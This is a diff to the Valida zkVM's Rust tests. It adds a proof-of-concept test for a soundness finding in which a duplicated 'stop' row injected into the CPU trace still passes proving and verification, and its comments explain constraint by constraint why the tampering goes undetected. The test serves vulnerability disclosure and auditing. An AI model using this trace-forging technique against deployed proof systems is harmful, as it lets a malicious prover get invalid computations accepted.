@@ -24,7 +24,7 @@ use valida_machine::{
 use valida_memory::MachineWithMemoryChip;
 use valida_opcodes::BYTES_PER_INSTR;
 use valida_output::{MachineWithOutputChip, WriteInstruction};
-use valida_program::{MachineWithProgramROM, ProgramTableType};
+use valida_program::{MachineWithProgramChip, MachineWithProgramROM, ProgramTableType};
 
 use p3_challenger::DuplexChallenger;
 use p3_dft::Radix2Bowers;
@@ -1603,4 +1603,167 @@ fn convert_array(input: [u64; 25]) -> [[u8; 4]; 50] {
     }
 
     output
+}
+
+// =============================================================================
+// PoC for Finding S-1: Instruction Re-execution Bypasses All Constraints
+// =============================================================================
+//
+// Root cause (from arguzz / valida-fuzzer report):
+//   The CPU chip has no constraint preventing an instruction from being
+//   executed more than once.  For `stop` at pc=0 specifically, re-executing
+//   it is COMPLETELY UNDETECTABLE because:
+//
+//   1. `when(is_stop).when_transition(): next.pc == 0`
+//      Both rows have pc=0 (stop never advances pc).  0 == 0 → ✓
+//
+//   2. `when(should_increment_pc): next.pc == local.pc + 1`
+//      `should_not_increment_pc` includes `is_stop`, so this constraint
+//      does not apply to stop instructions at all. → ✓
+//
+//   3. Memory bus: stop emits zero memory interactions → balanced. → ✓
+//
+//   4. Program ROM bus: the lookup argument allows multiple accesses to the
+//      same ROM entry (multiset), so 2 CPU sends for pc=0 are fine. → ✓
+//
+//   5. `when_last_row (is_last_segment): assert_one(is_stop)`
+//      Both rows are stop.  The last real row satisfies is_stop=1. → ✓
+//
+// The PoC:
+//   - Runs a single-instruction program (`stop`).
+//   - After execution, DUPLICATES the stop row in the CPU trace (simulating
+//     EXECUTE_INSTRUCTION_AGAIN injection at pc=0).
+//   - Calls prove() + verify() on the tampered trace.
+//   - If verify() returns Ok(()), the soundness bug is confirmed: the prover
+//     accepted an execution where stop fired twice (halting constraint not
+//     binding).
+//   - If verify() returns Err(_), the constraint system correctly rejected
+//     the invalid trace (finding is a false positive).
+//
+// Expected outcome for the bug to be present: verify() returns Ok(()).
+// The test is written to PASS when the bug is confirmed and PANIC otherwise.
+
+#[test]
+fn poc_s1_instruction_reexecution() {
+    type Val = BabyBear;
+    let fp: u32 = 0x1000;
+
+    // ── Step 1: build and run a minimal program (just `stop`) ──────────────
+    let program = vec![InstructionWord {
+        opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
+        operands: Operands::default(),
+    }];
+
+    let mut machine = BasicMachine::<Val>::default();
+    machine.set_segment_number(0);
+    machine.set_max_trace_height(65536);
+    let rom = ProgramROM::new(program);
+    machine.set_program_rom(rom, ProgramTableType::Public);
+    machine.set_initial_register_values(valida_cpu::Registers { pc: 0, fp });
+
+    let mut runtime = ValidaRuntime::default_for_field::<Val>();
+    let mut state = machine.start(&mut runtime);
+    let mut metrics = BasicMachineMetrics::initialize();
+
+    let (instance_data, _output) = BasicMachine::run(&mut state, &mut metrics);
+
+    assert_eq!(
+        state.machine.cpu.operations.len(),
+        1,
+        "Baseline: normal execution must produce exactly 1 CPU row (stop@pc=0)"
+    );
+    assert_eq!(
+        state.machine.cpu.registers[0].pc, 0,
+        "Baseline: stop is at pc=0"
+    );
+
+    // ── Step 2: inject duplicate stop row ──────────────────────────────────
+    //
+    // Manipulate the CPU chip's internal trace vectors directly to insert a
+    // second execution of stop@pc=0.  Stop has *no* memory operations, so
+    // the memory chip needs no changes.  The resulting CPU trace is:
+    //
+    //   clk=0: stop @ pc=0   (legitimate)
+    //   clk=1: stop @ pc=0   (injected re-execution)
+    //
+    // Constraint analysis (see header comment for why each one passes):
+    //   when(is_stop).when_transition(): next.pc == 0  →  0 == 0  ✓
+    //   PC-increment constraint skipped for stop       →         ✓
+    //   Memory bus balanced (no mem ops from stop)     →         ✓
+    //   Program ROM lookup: fixed below via read_word() →         ✓
+    let stop_reg = state.machine.cpu.registers[0]; // Registers { pc: 0, fp }
+    state.machine.cpu.registers.push(stop_reg);
+
+    let stop_op = state.machine.cpu.operations[0].clone(); // Operation::Stop
+    state.machine.cpu.operations.push(stop_op);
+
+    let stop_instr = state.machine.cpu.instructions[0]; // stop InstructionWord (Copy)
+    state.machine.cpu.instructions.push(stop_instr);
+
+    // Update clock count (was 1, now 2)
+    state.machine.cpu.clock = 2;
+
+    // Fix program ROM bus balance: the CPU now sends 2 interactions for pc=0
+    // (one per trace row), but the lookup chip's counts only recorded 1 access
+    // during the original execution.  Adding a second read_word(0, true) call
+    // increments the count to 2, matching the 2 CPU sends and keeping the
+    // multiset argument consistent.
+    state.machine.read_word(0, true);
+
+    println!("=== PoC S-1: Instruction Re-execution (duplicate stop@pc=0) ===");
+    println!(
+        "Tampered CPU trace pc values: {:?}",
+        state
+            .machine
+            .cpu
+            .registers
+            .iter()
+            .map(|r| r.pc)
+            .collect::<Vec<_>>()
+    );
+    println!("Both rows have pc=0; halting constraint 'next.pc==0 after stop' is trivially satisfied.");
+
+    // ── Step 3: prove and verify the tampered trace ─────────────────────────
+    let config = get_machine_config();
+    let (prover_opts, show_preprocessed, show_preprocessed_dims, show_public_verifier) =
+        prover_options();
+
+    let (pk, vk) = state
+        .machine
+        .pre_process(&config, show_preprocessed, show_preprocessed_dims);
+    let proof = state
+        .machine
+        .prove(&config, &pk, prover_opts, &instance_data);
+
+    let verify_result = state.machine.verify(
+        &config,
+        &proof,
+        &vk,
+        &instance_data,
+        show_public_verifier,
+    );
+
+    // ── Step 4: interpret the result ────────────────────────────────────────
+    match verify_result {
+        Ok(()) => {
+            // Bug confirmed: the prover accepted an invalid trace.
+            println!(
+                "\n[S-1 PoC CONFIRMED] verify() returned Ok(()): the prover accepted \
+                 a trace where stop@pc=0 was executed TWICE.  The halting constraint \
+                 is not binding for stop at pc=0.  A malicious prover could submit \
+                 traces with extra computation steps after halt.\n"
+            );
+            // Test intentionally passes to signal the bug is present.
+        }
+        Err(e) => {
+            // Prover correctly rejected the tampered trace.
+            panic!(
+                "\n[S-1 PoC REFUTED] verify() returned Err: the prover correctly \
+                 rejected the tampered trace.\nError: {:?}\n\
+                 Finding S-1 (EXECUTE_INSTRUCTION_AGAIN) may be a false positive \
+                 from the fuzzer's execution oracle.\n",
+                e
+            );
+        }
+    }
 }
